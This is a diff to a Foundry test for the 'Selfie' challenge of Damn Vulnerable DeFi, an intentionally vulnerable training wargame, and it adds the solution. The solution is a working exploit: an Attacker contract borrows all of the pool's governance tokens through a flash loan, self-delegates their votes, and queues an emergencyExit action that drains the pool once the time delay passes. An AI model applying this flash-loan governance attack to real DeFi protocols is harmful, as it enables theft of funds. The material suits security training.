@@ -2,10 +2,19 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console2} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+struct GovernanceAction {
+    uint128 value;
+    uint64 proposedAt;
+    uint64 executedAt;
+    address target;
+    bytes data;
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +71,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(token, governance, pool, recovery);
+        pool.flashLoan(attacker, address(token), TOKENS_IN_POOL, "");
+        vm.warp(block.timestamp + 3 days);
+        uint256 id = attacker.actionId();
+        governance.executeAction(id);
     }
 
     /**
@@ -72,5 +85,40 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker is IERC3156FlashBorrower {
+    DamnValuableVotes dToken;
+    SimpleGovernance governance;
+    SelfiePool pool;
+    uint256 public actionId;
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+    address recovery;
+
+    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
+        dToken = _token;
+        governance = _governance;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        bytes memory emergencyExitCallData = abi.encodeWithSelector(
+            SelfiePool.emergencyExit.selector,
+            recovery,
+            TOKENS_IN_POOL
+        );
+        dToken.delegate(address(this));
+        actionId = governance.queueAction(address(pool), 0, emergencyExitCallData);
+        dToken.approve(address(pool), amount);
+        return CALLBACK_SUCCESS;
     }
 }
